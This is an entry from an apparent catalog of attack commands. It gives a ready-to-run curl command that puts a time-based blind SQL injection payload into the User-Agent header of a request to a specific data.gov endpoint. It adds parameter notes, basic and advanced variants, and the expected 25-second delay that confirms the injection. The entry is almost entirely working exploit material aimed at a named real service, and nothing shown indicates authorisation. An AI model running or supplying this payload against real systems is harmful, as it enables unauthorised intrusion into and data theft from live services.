---
id: cmd-25s-curl
data: >-
  curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
  (KHTML, like Gecko)
  Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" -H "Referer: 1"
  -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H
  "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 30
  https://labs.data.gov/dashboard/datagov/csv_to_json
tags:
  - sqli
  - http
  - injection
type: command
output: HTTP response after ~25 seconds delay
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.342Z'
verified: false
validated: true
submitted: true
---
# curl-inject-25s-payload

## Command

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 30 https://labs.data.gov/dashboard/datagov/csv_to_json
```

## Description

Sends an HTTP GET request to the vulnerable endpoint with a SQL injection payload in the User-Agent header to trigger a 25-second SLEEP in MySQL, confirming time-based blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "User-Agent: ..."` | Injects the SQL payload into User-Agent | Yes |
| `--connect-timeout 30` | Allows for delay up to 30 seconds | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "User-Agent: payload_here" https://labs.data.gov/dashboard/datagov/csv_to_json
```

### Advanced Usage

```bash
curl -w "%{time_total}s" -H "User-Agent: full_payload" --connect-timeout 30 https://labs.data.gov/dashboard/datagov/csv_to_json
```

## Expected Output

Server JSON or error response after approximately 25 seconds, indicating successful SQL execution.

## Related

- [[commands/curl-inject-no-delay]]
- [[procedures/Confirm-SQLi-with-25-Second-Delay]]
